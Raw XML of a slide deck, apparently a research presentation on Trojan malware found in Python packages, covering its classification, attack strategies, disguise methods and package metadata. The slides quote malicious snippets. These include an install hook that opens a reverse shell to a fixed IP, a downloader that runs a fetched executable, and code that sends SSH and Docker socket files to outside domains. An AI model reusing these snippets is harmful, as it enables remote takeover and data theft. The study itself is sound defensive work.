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6" r:id="rId5"/>
    <p:sldId id="265" r:id="rId6"/>
    <p:sldId id="259" r:id="rId7"/>
    <p:sldId id="260" r:id="rId8"/>
    <p:sldId id="263" r:id="rId9"/>
    <p:sldId id="258" r:id="rId10"/>
    <p:sldId id="27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32435" y="149225"/>
            <a:ext cx="8309610" cy="17265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木马程序区别于其他恶意软件的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特征：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伪装性：木马程序通常隐藏在看似无害或有用的程序中。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恶意行为：在用户不知情的情况下执行恶意操作，如远程控制、数据窃取等。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用户交互：木马程序通常需要用户主动下载和运行，而不是自动传播。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68300" y="257492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32435" y="2095415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判定木马指标（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木马数据库建立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前提）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365625" y="2294890"/>
            <a:ext cx="3035300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400925" y="2161540"/>
            <a:ext cx="4252595" cy="9569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图表：列出恶意软件所有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恶意行为，选出木马程序的关键判定特征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--&gt;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进行木马程序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分类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41350" y="2473325"/>
            <a:ext cx="8100695" cy="4946650"/>
            <a:chOff x="-695" y="1220"/>
            <a:chExt cx="12757" cy="7790"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="16" name="文本框 15"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="-695" y="1220"/>
              <a:ext cx="9721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RQ1:</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="180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What is the definition of Trojan malware? How can they be classified based on their functionality?</a:t>
              </a:r>
              <a:endPara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73" y="2066"/>
              <a:ext cx="11189" cy="69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r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2800"/>
                <a:t>Remote Access Trojan</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800"/>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2800"/>
                <a:t>Infostealer Trojan</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800"/>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2800"/>
                <a:t>Banking Trojan</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800"/>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2800"/>
                <a:t>Downloader Trojan</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800"/>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2800"/>
                <a:t>Backdoor Trojan</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800"/>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2800"/>
                <a:t>Distributed Denial-of-Service Trojan</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800"/>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2800"/>
                <a:t>Ransom Trojan</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800"/>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2800"/>
                <a:t>Spy Trojan</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800"/>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2800"/>
                <a:t>Game-Thief Trojan</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800"/>
            </a:p>
            <a:p>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="18" name="直接箭头连接符 17"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6494145" y="2562225"/>
            <a:ext cx="1016635" cy="5416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41045" y="305435"/>
            <a:ext cx="4439285" cy="107632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Backdoor Trojan</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="3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3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25145" y="48895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0840" y="958215"/>
            <a:ext cx="52451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例：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0790" y="844550"/>
            <a:ext cx="91922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class CustomInstall(install):</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>    def run(self):</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>            install.run(self)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>     TCP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>套接字？</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>            s.connect(("104.248.19.57",3333))</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>            os.dup2(s.fileno(),0)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>            os.dup2(s.fileno(),1)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>            os.dup2(s.fileno(),2)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>            pty.spawn("/bin/sh")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76630" y="3659505"/>
            <a:ext cx="6582410" cy="70675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创建后门（创建远程连接，启动远程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</a:rPr>
              <a:t>shell)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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远程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控制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760730" y="375094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3829050" y="3331845"/>
            <a:ext cx="889000" cy="363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2762250" y="1984375"/>
            <a:ext cx="0" cy="1747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60730" y="409384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41045" y="305435"/>
            <a:ext cx="4076065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solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Downloader Trojan</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="3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25145" y="48895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85215" y="958215"/>
            <a:ext cx="1053973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try:</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>    env = os.environ['COMPUTERNAME']</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>    t = requests.get("https://linkedopports.com/pyp/resp.php?live=Installation " +env)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>    if platform == 'win32':</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>        url = 'https://python-release.com/python-install.scr'</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>        filename = 'ini_file_pyp_32.exe'</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>        rq = requests.get(url, allow_redirects=True)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>        open(filename, 'wb').write(rq.content)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>        os.system('start '+filename)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0840" y="958215"/>
            <a:ext cx="52451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例：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29285" y="382460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76630" y="3733165"/>
            <a:ext cx="4420235" cy="10147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向外部服务器发送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请求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下载和执行其他恶意软件或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文件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外部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</a:rPr>
              <a:t>URL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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613785" y="1843405"/>
            <a:ext cx="3851910" cy="2197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2762250" y="3458210"/>
            <a:ext cx="340360" cy="770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1243965" y="2620645"/>
            <a:ext cx="718820" cy="1496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170430" y="2376805"/>
            <a:ext cx="118110" cy="2218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629285" y="441007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29285" y="411734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741045" y="305435"/>
            <a:ext cx="3766185" cy="58356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32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Infostealer Trojan</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="32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25145" y="48895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29665" y="1104900"/>
            <a:ext cx="80810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ploads = {'/ ':ld0,'/root/':ld1,'/home/':ld2, '/root/.ssh/':ld3}</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>headers = {'content-type': 'application/x-www-form-urlencoded'}</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>requests.post('https://j0j0.xyz/lists/', data=ploads, verify=True, headers=headers)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0840" y="958215"/>
            <a:ext cx="52451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例：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25145" y="248285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95350" y="2390140"/>
            <a:ext cx="2916555" cy="10147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收集主机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信息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数据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外泄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窃取敏感</a:t>
            </a:r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文件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2080895" y="1694815"/>
            <a:ext cx="388620" cy="765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2080895" y="1998980"/>
            <a:ext cx="3274060" cy="9480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759200" y="2482850"/>
            <a:ext cx="75482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with open('/run/docker.sock','rb') as payload3:</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>    r = requests.post('https://j0j0.xyz/'+hostname+'/'+username+'/files/', data=payload3, verify=True, headers=headers)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540000" y="2747010"/>
            <a:ext cx="3007360" cy="525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525145" y="279654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25145" y="311023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44220" y="2317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RQ2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：What are the specific attack strategies employed by different types of Trojan malware?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0" y="1338580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s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>s.connect(("104.248.19.57",3333))</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>os.dup2(s.fileno(),0)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>os.dup2(s.fileno(),1)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>os.dup2(s.fileno(),2)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>pty.spawn("/bin/sh")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02910" y="1120775"/>
            <a:ext cx="52451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例：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9605" y="1338580"/>
            <a:ext cx="4908550" cy="1198880"/>
            <a:chOff x="1023" y="945"/>
            <a:chExt cx="7730" cy="1888"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="5" name="椭圆 4"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1023" y="1230"/>
              <a:ext cx="340" cy="34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756" y="1110"/>
              <a:ext cx="3558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reverse shell</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN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" name="左大括号 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4094" y="1110"/>
              <a:ext cx="131" cy="1694"/>
            </a:xfrm>
            <a:prstGeom prst="leftBrace">
              <a:avLst>
                <a:gd name="adj1" fmla="val 8333"/>
                <a:gd name="adj2" fmla="val 22018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315" y="945"/>
              <a:ext cx="4439" cy="188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TCP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连接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l"/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连接到远程</a:t>
              </a:r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IP</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="180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l"/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输入、输出流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重定向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l"/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伪终端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6" name="椭圆 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="687705" y="342900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64260" y="3352800"/>
            <a:ext cx="22593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数据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外泄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左大括号 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2209800" y="3352800"/>
            <a:ext cx="76200" cy="846455"/>
          </a:xfrm>
          <a:prstGeom prst="leftBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 8333"/>
              <a:gd name="adj2" fmla="val 22018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376170" y="3276600"/>
            <a:ext cx="1555115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DNS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查询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HTTP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请求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14290" y="31654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dns_domain = ".sub.deliverycontent.online"</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>http_domain = "www.deliverycontent.online"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088765" y="3810635"/>
            <a:ext cx="7731125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import urllib.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>request r = urllib.request.urlopen("http://%s/p" % http_domain, data=data_post.encode(), timeout=10) # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>发送</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>POST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>请求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r = urllib.request.urlopen("http://%s/g?d=%s" % (http_domain, data_get), timeout=10) # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>发送</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600"/>
              <a:t>GET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600"/>
              <a:t>请求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415290" y="39306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6755" y="340360"/>
            <a:ext cx="3909695" cy="1753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RQ0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：What are the transmission methods of Trojan viruses and the common platforms from which they originate?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graph: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传播方式和平台的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占比图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1190" y="2244090"/>
            <a:ext cx="5575300" cy="3660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传播方式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钓鱼邮件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>、恶意链接、软件捆绑、伪装成软件更新、伪装成合法文件（.exe、.pdf、.jpg）、假冒网站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平台：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>应用程序</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>、恶意网站、浏览器插件、游戏论坛和社区、邮件（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>邮箱）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Q:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>调查</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>方式？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92290" y="393065"/>
            <a:ext cx="3909695" cy="11988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RQ0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：What characteristics does the file structure of Trojan malware packages exhibit in comparison to benign software packages?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676390" y="47561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" name="组合 12"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="747395" y="772795"/>
            <a:ext cx="7950200" cy="2850515"/>
            <a:chOff x="820" y="3935"/>
            <a:chExt cx="12520" cy="4489"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="文本框 6"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1154" y="3935"/>
              <a:ext cx="383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伪装性：（？）</a:t>
              </a:r>
              <a:endPara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262" y="4450"/>
              <a:ext cx="11078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存在加密和解码行为（如引用加密库或用</a:t>
              </a:r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Base64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编码）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69" y="5204"/>
              <a:ext cx="9090" cy="322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r>
                <a:rPr lang="zh-CN" altLang="en-US"/>
                <a:t>class </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN"/>
                <a:t>xxxxxxxxxx</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US"/>
                <a:t>(install):</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US"/>
                <a:t>        def run(self):</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US"/>
                <a:t>            </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN"/>
                <a:t>.......</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US"/>
                <a:t>                </a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US"/>
                <a:t>from </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US">
                  <a:highlight>
                    <a:srgbClr val="FFFF00"/>
                  </a:highlight>
                </a:rPr>
                <a:t>fernet</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US"/>
                <a:t> import Fernet</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US"/>
                <a:t>                exec(Fernet(</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN"/>
                <a:t>xxxxxxxxxxxx</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US"/>
                <a:t>).decrypt(</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN"/>
                <a:t>xxxxxxxxxxxxx</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US"/>
                <a:t>))</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US"/>
                <a:t>            install.run(self)</a:t>
              </a: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20" y="5063"/>
              <a:ext cx="826" cy="62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2000">
                  <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                  <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
                </a:rPr>
                <a:t>例：</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="20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12" name="椭圆 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="693420" y="84899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73710" y="1276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RQ3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：What are the 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disguise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techniques employed by Trojan malware at the source code level?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86510" y="3781425"/>
            <a:ext cx="8125460" cy="9220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zh-CN" altLang="en-US"/>
              <a:t>b64data = base64.b64encode(data.encode()).decode()  encoded_data = ""</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>for c in b64data[:data_part_length]:</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>    encoded_data += "%02x" % ord(c)  # 将编码后的字符串转化为十六进制格式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447165" y="117602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447165" y="591058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45615" y="5834380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代码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注释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1905" y="4906010"/>
            <a:ext cx="912558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zh-CN" altLang="en-US"/>
              <a:t> subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> xxxxxxxxxxx)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2725" y="1011555"/>
            <a:ext cx="2783840" cy="7683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400">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>author</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="4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7284085" y="194310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04495" y="1807210"/>
            <a:ext cx="52451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例：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8015" y="2421255"/>
            <a:ext cx="5534025" cy="14662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SlChVbFmPVJlVbWZJ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</a:rPr>
              <a:t>              Isaac Muse</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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</a:rPr>
              <a:t>j0j0                                            TDV Alinsa</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="20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</a:rPr>
              <a:t>calword</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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1470" y="215900"/>
            <a:ext cx="3419475" cy="7683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400">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>PKG-INFO</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="4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2725" y="5250180"/>
            <a:ext cx="10487660" cy="7683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400">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>summary/description/license</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="4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88250" y="1837690"/>
            <a:ext cx="408749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字面上：乱字符、新造词、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UNKNOW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7130" y="2031365"/>
            <a:ext cx="7105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毒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包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77690" y="2031365"/>
            <a:ext cx="9772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良性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包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2725" y="3509010"/>
            <a:ext cx="2783840" cy="7683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400">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>email:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="4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0035" y="4277360"/>
            <a:ext cx="52451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B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>例：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="20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60830" y="4277360"/>
            <a:ext cx="7105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毒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包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92200" y="467614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d@doop.fun</a:t>
            </a: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284085" y="242125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88250" y="2332990"/>
            <a:ext cx="4087495" cy="1753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查询：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Q:pypi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无维护者列表、无法确认通过同户名找到的维护者是否是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author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（https://pypi.org/user/{username}/）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（部分查询到的无上传包或包数极少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,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对比良性包作者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明显）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椭圆 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="721360" y="36449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03935" y="274955"/>
            <a:ext cx="3909695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RQ4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：What role does Trojan malware play in different attack scenarios？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37945" y="1299210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part of the attack chain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03935" y="182943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90650" y="1747520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Initial intrusion tools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03935" y="235648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37945" y="2280285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Create a backdoor, hide and wait for instructions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03935" y="288353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390650" y="2813050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downloader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003935" y="3410585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337945" y="3345815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Privilege escalation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03935" y="3981450"/>
            <a:ext cx="215900" cy="2159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37945" y="3905250"/>
            <a:ext cx="70345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Steal and transmit data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右大括号 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6547485" y="2115820"/>
            <a:ext cx="170180" cy="1748155"/>
          </a:xfrm>
          <a:prstGeom prst="rightBrace">
            <a:avLst>
              <a:gd name="adj1" fmla="val 86567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595370" y="1904365"/>
            <a:ext cx="3035300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936365" y="4078605"/>
            <a:ext cx="3035300" cy="22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630670" y="1706245"/>
            <a:ext cx="24193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start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865620" y="2813050"/>
            <a:ext cx="22790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process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71665" y="3919855"/>
            <a:ext cx="227901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final stage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FlNDQxOGNkMTQ2YWFmZjQ0YmQ4MjdhZWFjYjhmNT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3708</Words>
  <Application>WPS 演示</Application>
  <PresentationFormat>宽屏</PresentationFormat>
  <Paragraphs>194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李火华</dc:creator>
  <cp:lastModifiedBy>街道</cp:lastModifiedBy>
  <cp:revision>8</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2023-08-09T12:44:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-10-11T16:29:11Z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2052-12.1.0.17857</vt:lpwstr>
  </property>
</Properties>
</file>